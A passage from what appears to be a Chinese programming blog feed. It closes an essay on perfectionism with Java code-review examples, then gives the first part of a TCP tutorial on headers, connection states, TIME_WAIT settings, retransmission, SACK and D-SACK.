<p><strong>完美有多远？我不知道，但我愿意多往前走一步。</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E6%8B%BE%E8%B5%B7%E5%88%9D%E8%A1%B7"></span>二、拾起初衷<span class="ez-toc-section-end"></span>
</h4>
<p>我们的生活，每天很忙碌。有时候忙得自己都忘记了为什么在此处，有时候忙得只能不断地用直觉、用以往的经验去设计一个解决方案，而没有时间去思考需求是不是合理，方案是不是最佳，我们以为自己设计的是最佳实践，谁知道呢？</p>
<p>这个社会，这个世界，处在一个以不可思议的速度向前直奔的时间线上，我们处在这个时代的浪潮之上，每个人都感到了那种令人窒息的紧迫感。</p>
<p>父母都是不希望孩子太累的，我们见过很多这样的话：</p>
<p style="padding-left: 30px;"><strong>差不多就行了。</strong></p>
<p style="padding-left: 30px;"><strong>糊弄糊弄就完事了。</strong></p>
<p style="padding-left: 30px;"><strong>不要与众不同。</strong></p>
<p style="padding-left: 30px;"><strong>顺其自然。</strong></p>
<p>但是你应该问问自己，是不是真的要 <a href="http://blog.hesey.net/2010/05/is-let-it-be-consolation-or-excuse.html" target="_blank">顺其自然</a> ？</p>
<p>我记得在上大二的时候，听一个叫端木恒的人说过一句话，大意是，<strong>这个世界上，政治可以改变很多事情，而科技，可以通过促进信息的流通，最终去推动政治的变革，去改变整个世界。</strong></p>
<p>当时觉得这事儿太酷了，是的，所以我当时的想法是，要去一个技术足够强大，并且对人们的生活有实质影响的公司。希望用技术的力量去让更多人生活地更好。</p>
<p>这当然是一种不自量力，但又如何呢？只是一个普通人小小的想法，不断追求卓越，愿意比别人多往前走一步而已。</p>
<p>就像冯大辉说的：</p>
<p style="padding-left: 30px;"><strong>所有人都说你做不成，都告诉你不要去做，不靠谱，嘲讽你，而你最后真的把事情做起来了，这就是牛逼。</strong></p>
<p>做成了，其实牛不牛逼对你自己而言已经不重要了。</p>
<p>没做成，所有人都笑你是傻逼，但起码也对得起自己的内心。</p>
<p>再说，如果 <a href="http://blog.hesey.net/2010/05/strength-of-the-young.html" target="_blank">青年人</a> 想的都是养老和退休，那做事的人在哪？</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E5%8F%91%E7%8E%B0%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%87%AA%E5%B7%B1"></span>三、发现更好的自己<span class="ez-toc-section-end"></span>
</h4>
<p>老罗最后的一个问题是：</p>
<p style="padding-left: 30px;"><strong>在一个完美主义者的眼里，这是一个怎样的世界？</strong></p>
<p>这个社会上很多人在生活上追求更高的品质，但愿意对自己手头所做的事情坚持高标准坚持卓越理念的人已经不多见了，以至于我们发现<strong>花再多的钱也买不到安全的食品了，花了一辈子的积蓄买的房子却有各种质量问题。</strong>扪心自问自己在工作中是否能坚持某些东西，大部分人的态度都差不多，只是你糊弄一下不会怎样，而他马虎一点就会死人，区别仅仅在于这里。</p>
<p>M·斯科特·派克说过一句话：</p>
<p style="padding-left: 30px;"><strong>规避问题和逃避问题的趋向，是人类心理疾病的根源。</strong></p>
<p>很多人把随大流把妥协作为一种「成熟」的标志，小时候敢想敢说可能也敢做，长大以后懂得了人情世故，懂得向现实妥协，45度角仰望天空说自己终于长大了。再看身边那些「冥顽不灵」、「认死理」的所谓完美主义者，认为这些人才是不正常的群体，把这些人要么当做傻逼要么当做装逼。</p>
<p>天哪，我都想问，「这是一个怎样的世界？」</p>
<p>肯定有人会说，站着说话不腰疼。诚然，在生活中，有的人是为了活下去，有的人是为了活得更好，有的人是为了帮助别人活得更好。这是不同的人生阶段，每个人的情况不一样，但这并不影响每个人内心的精神寄托和对信念的追求。</p>
<p>我从不指望去改变别人，但我相信我可以改变自己，虽然也很难。</p>
<p>学生都喜欢问，如何最快地告诉自己的能力。说实话，我真的不知道什么是捷径，我的经验就是和比你优秀的人一起工作，经常请教比你资深的人，不断挑战过去的自己（每天审视自己太紧张了，只要比前段时间的自己更好就可以了）。</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E7%BB%86%E8%8A%82%E6%98%AF%E9%AD%94%E9%AC%BC"></span>四、细节是魔鬼<span class="ez-toc-section-end"></span>
</h4>
<p>Devils are in the details，细节是魔鬼，这句话很多人都听过，但要在工作中时时刻刻注意？难。</p>
<p>前几天给同事做Code Review，就几行代码，发现了一个问题。</p>
<p style="padding-left: 30px;">场景是我们发现某个系统中存在占用内存超大的HTML字符串，需要统计HTML字符串的长度，于是为了获得准确的字节长度，这段代码调用的是String.getBytes().length，一眼看起来并没有什么大问题。</p>
<p style="padding-left: 30px;">但是考虑到本身这个字符串就比较大，联想到Java内部是用UTF-16存储字符串的，而getBytes()会转换为系统默认编码（GBK或是UTF-8等等），这里必然存在底层字符数组的拷贝（可以去参考String.getBytes()的源代码证实），一个本身就很大的字符串，经过拷贝，将会占用更多的内存，加剧这个问题，而在HTML中，中文其实只占了非常小的一部分，所以直接用String.length()，虽然会少数几个字符，但对统计结果影响其实并不大，并且这里不存在任何数组分配的开销。</p>
<p style="padding-left: 30px;">另外建议所有调用String.getBytes()的地方通通显式传入编码，这是个大坑。（<em>陈皓注：用String.length代替getBytes().length，也是在给未来挖坑——如果未来有人要用len来干别的事，那么这个不精确的len可能就是一个大坑</em>）</p>
<p>另外一个案例，也是在Code Review的时候发现的。</p>
<p style="padding-left: 30px;">某个调用场景下，每次都会新建一个解析器对象去解析结果，尽管解析器没有任何实例变量不会产生线程安全问题，创建的开销也并不大，但我还是坚持要改成单例，使用同一个实例去处理，这也符合面向GC编程的思想。</p>
<p style="padding-left: 30px;">这些场景，每天我们都在遇到，<strong>也许我们会说这些都是很小的问题，无伤大雅，差不多就行了。</strong>但就像前面说的，这是一种态度，一种思维习惯，当你坚持用最高的标准去要求自己，去要求自己的工作时，你才有可能渐渐接近卓越。细节是魔鬼，它会在完全察觉不到的时刻，把人拉回平庸。</p>
<p>「我不是为了输赢，我就是认真。」这不代表我们不在乎输赢，从头至尾我都坚信，只有坚持完美，坚持品质，坚持那些我们曾经了解现在可能已经放弃了的美好的东西，像一个老工匠，把一种专注、追求极致的情怀融入我们的作品里，也许有一天，就有人，追寻着 <a href="http://blog.hesey.net/2010/04/a-time-without-dreams.html" target="_blank">梦想</a> ，发现了 <a href="http://blog.hesey.net/2012/02/posibilities-of-life.html" target="_blank">生活更多的可能性</a> ，像乔布斯、像贝索斯，改变整个行业，改变全世界。</p>
<p>我们是被这个时代推上浪潮之巅的人，是去做一个见证者，或是一个冲在最前面也不怕被拍死的傻瓜，是我们每个人选择的权利。</p>
<p>只是不要忘记，那些傻瓜，不是真的不怕死，<strong>他们只是认真</strong>。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-05-26T11:20:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/11629.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ TCP 的那些事儿（上） ]]></title>
<link>https://coolshell.cn/articles/11564.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >TCP是一个巨复杂的协议，因为他要解决很多问题，而这些问题又带出了很多子问题和阴暗面。所以学习TCP本身是个比较痛苦的过程，但对于学习的过程却能让人有很多收获。关于TCP这个协议的细节，我还是推荐你去看<a href="http://www.kohala.com/start/" target="_blank">W.Richard Stevens</a>的《<a href="https://book.douban.com/subject/1088054/" target="_blank">TCP/IP 详解 卷1：协议</a>》（当然，你也可以去读一下<a href="https://tools.ietf.org/html/rfc793" target="_blank">RFC793</a>以及后面N多的RFC）。另外，本文我会使用英文术语，这样方便你通过这些英文关键词来查找相关的技术文档。</p>
<p>之所以想写这篇文章，目的有三个，</p>
<ul>
<li>一个是想锻炼一下自己是否可以用简单的篇幅把这么复杂的TCP协议描清楚的能力。</li>
<li>另一个是觉得现在的好多程序员基本上不会认认真真地读本书，喜欢快餐文化，所以，希望这篇快餐文章可以让你对TCP这个古典技术有所了解，并能体会到软件设计中的种种难处。并且你可以从中有一些软件设计上的收获。</li>
<li>最重要的希望这些基础知识可以让你搞清很多以前一些似是而非的东西，并且你能意识到基础的重要。</li>
</ul>
<p>所以，本文不会面面俱到，只是对TCP协议、算法和原理的科普。</p>
<p><span id="more-11564"></span></p>
<p>我本来只想写一个篇幅的文章的，但是TCP真TMD的复杂，比C++复杂多了，这30多年来，各种优化变种争论和修改。所以，写着写着就发现只有砍成两篇。</p>
<ul>
<li>上篇中，主要向你介绍TCP协议的定义和丢包时的重传机制。</li>
<li>下篇中，重点介绍TCP的流迭、拥塞处理。</li>
</ul>
<p>废话少说，首先，我们需要知道TCP在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层，在第二层上的数据，我们叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。</p>
<p>首先，我们需要知道，我们程序的数据首先会打到TCP的Segment中，然后TCP的Segment会打到IP的Packet中，然后再打到以太网Ethernet的Frame中，传到对端后，各个层解析自己的协议，然后把数据交给更高层的协议处理。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#TCP%E5%A4%B4%E6%A0%BC%E5%BC%8F" title="TCP头格式">TCP头格式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#TCP%E7%9A%84%E7%8A%B6%E6%80%81%E6%9C%BA" title="TCP的状态机">TCP的状态机</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E4%B8%AD%E7%9A%84Sequence_Number" title="数据传输中的Sequence Number">数据传输中的Sequence Number</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-4" href="#TCP%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6" title="TCP重传机制">TCP重传机制</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%B6%85%E6%97%B6%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6" title="超时重传机制">超时重传机制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%BF%AB%E9%80%9F%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6" title="快速重传机制">快速重传机制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#SACK_%E6%96%B9%E6%B3%95" title="SACK 方法">SACK 方法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#Duplicate_SACK_-_%E9%87%8D%E5%A4%8D%E6%94%B6%E5%88%B0%E6%95%B0%E6%8D%AE%E7%9A%84%E9%97%AE%E9%A2%98" title="Duplicate SACK – 重复收到数据的问题">Duplicate SACK – 重复收到数据的问题</a></li>
</ul>
</li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="TCP%E5%A4%B4%E6%A0%BC%E5%BC%8F"></span>TCP头格式<span class="ez-toc-section-end"></span>
</h4>
<p>接下来，我们来看一下TCP头的格式</p>
<p style="text-align: center;"><img alt="image placeholder" >TCP头格式（<a href="https://nmap.org/book/tcpip-ref.html" target="_blank">图片来源</a>）</p>
<p>你需要注意这么几点：</p>
<ul>
<li>TCP的包是没有IP地址的，那是IP层上的事。但是有源端口和目标端口。</li>
<li>一个TCP连接需要四个元组来表示是同一个连接（src_ip, src_port, dst_ip, dst_port）准确说是五元组，还有一个是协议。但因为这里只是说TCP协议，所以，这里我只说四元组。</li>
<li>注意上图中的四个非常重要的东西：
<ul>
<li>
<strong>Sequence Number</strong>是包的序号，<strong>用来解决网络包乱序（reordering）问题。</strong>
</li>
<li>
<strong>Acknowledgement Number</strong>就是ACK——用于确认收到，<strong>用来解决不丢包的问题</strong>。</li>
<li>
<strong>Window又叫Advertised-Window</strong>，也就是著名的滑动窗口（Sliding Window），<strong>用于解决流控的</strong>。</li>
<li>
<strong>TCP Flag</strong> ，也就是包的类型，<strong>主要是用于操控TCP的状态机的</strong>。</li>
</ul>
</li>
</ul>
<p>关于其它的东西，可以参看下面的图示</p>
<p><img alt="image placeholder" ></p>
<p style="text-align: center;">（<a href="https://nmap.org/book/tcpip-ref.html" target="_blank">图片来源</a>）</p>
<h4>
<span class="ez-toc-section" id="TCP%E7%9A%84%E7%8A%B6%E6%80%81%E6%9C%BA"></span>TCP的状态机<span class="ez-toc-section-end"></span>
</h4>
<p>其实，<strong>网络上的传输是没有连接的，包括TCP也是一样的</strong>。而TCP所谓的“连接”，其实只不过是在通讯的双方维护一个“连接状态”，让它看上去好像有连接一样。所以，TCP的状态变换是非常重要的。</p>
<p>下面是：“<strong>TCP协议的状态机</strong>”（<a href="http://www.tcpipguide.com/free/t_TCPOperationalOverviewandtheTCPFiniteStateMachineF-2.htm" target="_blank">图片来源</a>） 和 “<strong>TCP建链接</strong>”、“<strong>TCP断链接</strong>”、“<strong>传数据</strong>” 的对照图，我把两个图并排放在一起，这样方便在你对照着看。另外，下面这两个图非常非常的重要，你一定要记牢。（吐个槽：看到这样复杂的状态机，就知道这个协议有多复杂，复杂的东西总是有很多坑爹的事情，所以TCP协议其实也挺坑爹的）</p>
<p><img alt="image placeholder" > <img alt="image placeholder" ></p>
<p>很多人会问，为什么建链接要3次握手，断链接需要4次挥手？</p>
<ul>
<li>
<strong>对于建链接的3次握手，</strong>主要是要初始化Sequence Number 的初始值。通信的双方要互相通知对方自己的初始化的Sequence Number（缩写为ISN：Inital Sequence Number）——所以叫SYN，全称Synchronize Sequence Numbers。也就上图中的 x 和 y。这个号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输的问题而乱序（TCP会用这个序号来拼接数据）。</li>
</ul>
<ul>
<li>
<strong>对于4次挥手，</strong>其实你仔细看是2次，因为TCP是全双工的，所以，发送方和接收方都需要Fin和Ack。只不过，有一方是被动的，所以看上去就成了所谓的4次挥手。如果两边同时断连接，那就会就进入到CLOSING状态，然后到达TIME_WAIT状态。下图是双方同时断连接的示意图（你同样可以对照着TCP状态机看）：</li>
</ul>
<p style="text-align: center;"><img alt="image placeholder" ><br>
两端同时断连接（<a href="http://www.tcpipguide.com/free/t_TCPConnectionTermination-4.htm" target="_blank">图片来源</a>）</p>
<p> </p>
<p>另外，有几个事情需要注意一下：</p>
<ul>
<li>
<strong>关于建连接时SYN超时</strong>。试想一下，如果server端接到了clien发的SYN后回了SYN-ACK后client掉线了，server端没有收到client回来的ACK，那么，这个连接处于一个中间状态，即没成功，也没失败。于是，server端如果在一定时间内没有收到的TCP会重发SYN-ACK。在Linux下，默认重试次数为5次，重试的间隔时间从1s开始每次都翻售，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s都知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s = 2^6 -1 = 63s，TCP才会把断开这个连接。</li>
</ul>
<ul>
<li>
<strong>关于SYN Flood攻击</strong>。一些恶意的人就为此制造了SYN Flood攻击——给服务器发了一个SYN后，就下线了，于是服务器需要默认等63s才会断开连接，这样，攻击者就可以把服务器的syn连接的队列耗尽，让正常的连接请求不能处理。于是，Linux下给了一个叫<strong>tcp_syncookies</strong>的参数来应对这个事——当SYN队列满了后，TCP会通过源地址端口、目标地址端口和时间戳打造出一个特别的Sequence Number发回去（又叫cookie），如果是攻击者则不会有响应，如果是正常连接，则会把这个 SYN Cookie发回来，然后服务端可以通过cookie建连接（即使你不在SYN队列中）。请注意，<strong>请先千万别用tcp_syncookies来处理正常的大负载的连接的情况</strong>。因为，synccookies是妥协版的TCP协议，并不严谨。对于正常的请求，你应该调整三个TCP参数可供你选择，第一个是：tcp_synack_retries 可以用他来减少重试次数；第二个是：tcp_max_syn_backlog，可以增大SYN连接数；第三个是：tcp_abort_on_overflow 处理不过来干脆就直接拒绝连接了。</li>
</ul>
<ul>
<li>
<strong>关于ISN的初始化</strong>。ISN是不能hard code的，不然会出问题的——比如：如果连接建好后始终用1来做ISN，如果client发了30个segment过去，但是网络断了，于是 client重连，又用了1做ISN，但是之前连接的那些包到了，于是就被当成了新连接的包，此时，client的Sequence Number 可能是3，而Server端认为client端的这个号是30了。全乱了。<a href="https://tools.ietf.org/html/rfc793" target="_blank">RFC793</a>中说，ISN会和一个假的时钟绑在一起，这个时钟会在每4微秒对ISN做加一操作，直到超过2^32，又从0开始。这样，一个ISN的周期大约是4.55个小时。因为，我们假设我们的TCP Segment在网络上的存活时间不会超过Maximum Segment Lifetime（缩写为MSL – <a href="https://en.wikipedia.org/wiki/Maximum_Segment_Lifetime" target="_blank">Wikipedia语条</a>），所以，只要MSL的值小于4.55小时，那么，我们就不会重用到ISN。</li>
</ul>
<ul>
<li>
<strong>关于 MSL 和 TIME_WAIT</strong>。通过上面的ISN的描述，相信你也知道MSL是怎么来的了。我们注意到，在TCP的状态图中，从TIME_WAIT状态到CLOSED状态，有一个超时设置，这个超时设置是 2*MSL（<a href="https://tools.ietf.org/html/rfc793" target="_blank">RFC793</a>定义了MSL为2分钟，Linux设置成了30s）为什么要这有TIME_WAIT？为什么不直接给转成CLOSED状态呢？主要有两个原因：1）TIME_WAIT确保有足够的时间让对端收到了ACK，如果被动关闭的那方没有收到Ack，就会触发被动端重发Fin，一来一去正好2个MSL，2）有足够的时间让这个连接不会跟后面的连接混在一起（你要知道，有些自做主张的路由器会缓存IP数据包，如果连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起）。你可以看看这篇文章《<a href="http://www.serverframework.com/asynchronousevents/2011/01/time-wait-and-its-design-implications-for-protocols-and-scalable-servers.html" target="_blank">TIME_WAIT and its design implications for protocols and scalable client server systems</a>》</li>
</ul>
<ul>
<li>
<strong>关于TIME_WAIT数量太多</strong>。从上面的描述我们可以知道，TIME_WAIT是个很重要的状态，但是如果在大并发的短链接下，TIME_WAIT 就会太多，这也会消耗很多系统资源。只要搜一下，你就会发现，十有八九的处理方式都是教你设置两个参数，一个叫<strong>tcp_tw_reuse</strong>，另一个叫<strong>tcp_tw_recycle</strong>的参数，这两个参数默认值都是被关闭的，后者recyle比前者resue更为激进，resue要温柔一些。另外，如果使用tcp_tw_reuse，必需设置tcp_timestamps=1，否则无效。这里，你一定要注意，<strong>打开这两个参数会有比较大的坑——可能会让TCP连接出一些诡异的问题</strong>（因为如上述一样，如果不等待超时重用连接的话，新的连接可能会建不上。正如<a href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt" target="_blank">官方文档</a>上说的一样“<strong>It should not be changed without advice/request of technical experts</strong>”）。</li>
</ul>
<ul>
<ul style="padding-left: 30px;">
<li>
<strong>关于tcp_tw_reuse</strong>。官方文档上说tcp_tw_reuse 加上tcp_timestamps（又叫PAWS, for Protection Against Wrapped Sequence Numbers）可以保证协议的角度上的安全，但是你需要tcp_timestamps在两边都被打开（你可以读一下<a href="http://lxr.free-electrons.com/ident?i=tcp_twsk_unique">tcp_twsk_unique</a>的源码<span style="color: #000000;"> </span>）。我个人估计还是有一些场景会有问题。</li>
</ul>
</ul>
<ul style="padding-left: 30px;">
<ul>
<li>
<strong>关于tcp_tw_recycle</strong>。如果是tcp_tw_recycle被打开了话，会假设对端开启了tcp_timestamps，然后会去比较时间戳，如果时间戳变大了，就可以重用。但是，如果对端是一个NAT网络的话（如：一个公司只用一个IP出公网）或是对端的IP被另一台重用了，这个事就复杂了。建链接的SYN可能就被直接丢掉了（你可能会看到connection time out的错误）（如果你想观摩一下Linux的内核代码，请参看源码<a href="http://lxr.free-electrons.com/ident?i=tcp_timewait_state_process"> tcp_timewait_state_process</a>）。</li>
</ul>
</ul>
<ul style="padding-left: 30px;">
<ul>
<li>
<strong style="color: #373737;">关于tcp_max_tw_buckets</strong>。这个是控制并发的TIME_WAIT的数量，默认值是180000，如果超限，那么，系统会把多的给destory掉，然后在日志里打一个警告（如：<span style="color: #373737;">time wait bucket table overflow</span>），官网文档说这个参数是用来对抗DDoS攻击的。也说的默认值180000并不小。这个还是需要根据实际情况考虑。</li>
</ul>
</ul>
<p><strong>Again，使用tcp_tw_reuse和tcp_tw_recycle来解决TIME_WAIT的问题是非常非常危险的，因为这两个参数违反了TCP协议（<a href="https://tools.ietf.org/html/rfc1122" target="_blank">RFC 1122</a>） </strong></p>
<p>其实，TIME_WAIT表示的是你主动断连接，所以，这就是所谓的“不作死不会死”。试想，如果让对端断连接，那么这个破问题就是对方的了，呵呵。另外，如果你的服务器是于HTTP服务器，那么设置一个<a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection" target="_blank">HTTP的KeepAlive</a>有多重要（浏览器会重用一个TCP连接来处理多个HTTP请求），然后让客户端去断链接（你要小心，浏览器可能会非常贪婪，他们不到万不得已不会主动断连接）。</p>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E4%B8%AD%E7%9A%84Sequence_Number"></span>数据传输中的Sequence Number<span class="ez-toc-section-end"></span>
</h4>
<p>下图是我从Wireshark中截了个我在访问coolshell.cn时的有数据传输的图给你看一下，SeqNum是怎么变的。（使用Wireshark菜单中的Statistics -&gt;Flow Graph… ）</p>
<p><img alt="image placeholder" ></p>
<p>你可以看到，<strong>SeqNum的增加是和传输的字节数相关的</strong>。上图中，三次握手后，来了两个Len:1440的包，而第二个包的SeqNum就成了1441。然后第一个ACK回的是1441，表示第一个1440收到了。</p>
<p><strong>注意</strong>：如果你用Wireshark抓包程序看3次握手，你会发现SeqNum总是为0，不是这样的，Wireshark为了显示更友好，使用了Relative SeqNum——相对序号，你只要在右键菜单中的protocol preference 中取消掉就可以看到“Absolute SeqNum”了</p>
<h4>
<span class="ez-toc-section" id="TCP%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6"></span>TCP重传机制<span class="ez-toc-section-end"></span>
</h4>
<p>TCP要保证所有的数据包都可以到达，所以，必需要有重传机制。</p>
<p>注意，接收端给发送端的Ack确认只会确认最后一个连续的包，比如，发送端发了1,2,3,4,5一共五份数据，接收端收到了1，2，于是回ack 3，然后收到了4（注意此时3没收到），此时的TCP会怎么办？我们要知道，因为正如前面所说的，<strong>SeqNum和Ack是以字节数为单位，所以ack的时候，不能跳着确认，只能确认最大的连续收到的包</strong>，不然，发送端就以为之前的都收到了。</p>
<h5>
<span class="ez-toc-section" id="%E8%B6%85%E6%97%B6%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6"></span>超时重传机制<span class="ez-toc-section-end"></span>
</h5>
<p>一种是不回ack，死等3，当发送方发现收不到3的ack超时后，会重传3。一旦接收方收到3后，会ack 回 4——意味着3和4都收到了。</p>
<p>但是，这种方式会有比较严重的问题，那就是因为要死等3，所以会导致4和5即便已经收到了，而发送方也完全不知道发生了什么事，因为没有收到Ack，所以，发送方可能会悲观地认为也丢了，所以有可能也会导致4和5的重传。</p>
<p>对此有两种选择：</p>
<ul>
<li>一种是仅重传timeout的包。也就是第3份数据。</li>
<li>另一种是重传timeout后所有的数据，也就是第3，4，5这三份数据。</li>
</ul>
<p>这两种方式有好也有不好。第一种会节省带宽，但是慢，第二种会快一点，但是会浪费带宽，也可能会有无用功。但总体来说都不好。因为都在等timeout，timeout可能会很长（在下篇会说TCP是怎么动态地计算出timeout的）</p>
<h5>
<span class="ez-toc-section" id="%E5%BF%AB%E9%80%9F%E9%87%8D%E4%BC%A0%E6%9C%BA%E5%88%B6"></span>快速重传机制<span class="ez-toc-section-end"></span>
</h5>
<p>于是，TCP引入了一种叫<strong>Fast Retransmit</strong> 的算法，<strong>不以时间驱动，而以数据驱动重传</strong>。也就是说，如果，包没有连续到达，就ack最后那个可能被丢了的包，如果发送方连续收到3次相同的ack，就重传。Fast Retransmit的好处是不用等timeout了再重传。</p>
<p>比如：如果发送方发出了1，2，3，4，5份数据，第一份先到送了，于是就ack回2，结果2因为某些原因没收到，3到达了，于是还是ack回2，后面的4和5都到了，但是还是ack回2，因为2还是没有收到，于是发送端收到了三个ack=2的确认，知道了2还没有到，于是就马上重转2。然后，接收端收到了2，此时因为3，4，5都收到了，于是ack回6。示意图如下：</p>
<p><img alt="image placeholder" ></p>
<p>Fast Retransmit只解决了一个问题，就是timeout的问题，它依然面临一个艰难的选择，就是，是重传之前的一个还是重传所有的问题。对于上面的示例来说，是重传#2呢还是重传#2，#3，#4，#5呢？因为发送端并不清楚这连续的3个ack(2)是谁传回来的？也许发送端发了20份数据，是#6，#10，#20传来的呢。这样，发送端很有可能要重传从2到20的这堆数据（这就是某些TCP的实际的实现）。可见，这是一把双刃剑。</p>
<h5>
<span class="ez-toc-section" id="SACK_%E6%96%B9%E6%B3%95"></span>SACK 方法<span class="ez-toc-section-end"></span>
</h5>
<p>另外一种更好的方式叫：<strong>Selective Acknowledgment (SACK)</strong>（参看<a href="https://tools.ietf.org/html/rfc2018" target="_blank">RFC 2018</a>），这种方式需要在TCP头里加一个SACK的东西，ACK还是Fast Retransmit的ACK，SACK则是汇报收到的数据碎版。参看下图：</p>
<p><img alt="image placeholder" ></p>
<p>这样，在发送端就可以根据回传的SACK来知道哪些数据到了，哪些没有到。于是就优化了Fast Retransmit的算法。当然，这个协议需要两边都支持。在 Linux下，可以通过<strong>tcp_sack</strong>参数打开这个功能（Linux 2.4后默认打开）。</p>
<p>这里还需要注意一个问题——<strong>接收方Reneging，所谓Reneging的意思就是接收方有权把已经报给发送端SACK里的数据给丢了</strong>。这样干是不被鼓励的，因为这个事会把问题复杂化了，但是，接收方这么做可能会有些极端情况，比如要把内存给别的更重要的东西。<strong>所以，发送方也不能完全依赖SACK，还是要依赖ACK，并维护Time-Out，如果后续的ACK没有增长，那么还是要把SACK的东西重传，另外，接收端这边永远不能把SACK的包标记为Ack。</strong></p>
<p>注意：SACK会消费发送方的资源，试想，如果一个攻击者给数据发送方发一堆SACK的选项，这会导致发送方开始要重传甚至遍历已经发出的数据，这会消耗很多发送端的资源。详细的东西请参看《<a href="https://www.ibm.com/developerworks/cn/linux/l-tcp-sack/" target="_blank">TCP SACK的性能权衡</a>》</p>
<h5>
<span class="ez-toc-section" id="Duplicate_SACK_-_%E9%87%8D%E5%A4%8D%E6%94%B6%E5%88%B0%E6%95%B0%E6%8D%AE%E7%9A%84%E9%97%AE%E9%A2%98"></span>Duplicate SACK – 重复收到数据的问题<span class="ez-toc-section-end"></span>
</h5>
<p>Duplicate SACK又称D-SACK，<strong>其主要使用了SACK来告诉发送方有哪些数据被重复接收了</strong>。<a href="https://www.ietf.org/rfc/rfc2883.txt" target="_blank">RFC-2883 </a>里有详细描述和示例。下面举几个例子（来源于<a href="https://www.ietf.org/rfc/rfc2883.txt" target="_blank">RFC-2883</a>）</p>
<p>D-SACK使用了SACK的第一个段来做标志，</p>
<ul>
<li>如果SACK的第一个段的范围被ACK所覆盖，那么就是D-SACK</li>
</ul>
<ul>
<li>如果SACK的第一个段的范围被SACK的第二个段覆盖，那么就是D-SACK</li>
</ul>
<p><strong>示例一：ACK丢包</strong></p>
<p>下面的示例中，丢了两个ACK，所以，发送端重传了第一个数据包（3000-3499），于是接收端发现重复收到，于是回了一个SACK=3000-3500，因为ACK都到了4000意味着收到了4000之前的所有数据，所以这个SACK就是D-SACK——旨在告诉发送端我收到了重复的数据，而且我们的发送端还知道，数据包没有丢，丢的是ACK包。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">	Transmitted  Received    ACK Sent
	Segment      Segment     (Including SACK Blocks)

	3000-3499    3000-3499   3500 (ACK dropped)
	3500-3999    3500-3999   4000 (ACK dropped)
	3000-3499    3000-3499   4000, SACK=3000-3500
                                        ---------</pre>
<p><strong> 示例二，网络延误</strong></p>
<p>下面的示例中，网络包（1000-1499）被网络给延误了，导致发送方没有收到ACK，而后面到达的三个包触发了“Fast Retransmit算法”，所以重传，但重传时，被延误的包又到了，所以，回了一个SACK=1000-1500，因为ACK已到了3000，所以，这个SACK是D-SACK——标识收到了重复的包。</p>
<p>这个案例下，发送端知道之前因为“Fast Retransmit算法”触发的重传不是因为发出去的包丢了，也不是因为回应的ACK包丢了，而是因为网络延时了。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">    Transmitted    Received    ACK Sent
    Segment        Segment     (Including SACK Blocks)

    500-999        500-999     1000
    1000-1499      (delayed)
    1500-1999      1500-1999   1000, SACK=1500-2000
    2000-2499      2000-2499   1000, SACK=1500-2500
    2500-2999      2500-2999   1000, SACK=1500-3000
    1000-1499      1000-1499   3000
                   1000-1499   3000, SACK=1000-1500
                                          ---------</pre>
<p> </p>
<p>可见，引入了D-SACK，有这么几个好处：</p>
<p style="padding-left: 30px;">1）可以让发送方知道，是发出去的包丢了，还是回来的ACK包丢了。</p>
<p style="padding-left: 30px;">2）是不是自己的timeout太小了，导致重传。</p>
<p style="padding-left: 30px;">3）网络上出现了先发的包后到的情况（又称reordering）</p>
<p style="padding-left: 30px;">4）网络上是不是把我的数据包给复制了。</p>
<p> <strong>知道这些东西可以很好得帮助TCP了解网络情况，从而可以更好的做网络上的流控</strong>。</p>
<p>Linux下的tcp_dsack参数用于开启这个功能（Linux 2.4后默认打开）</p>
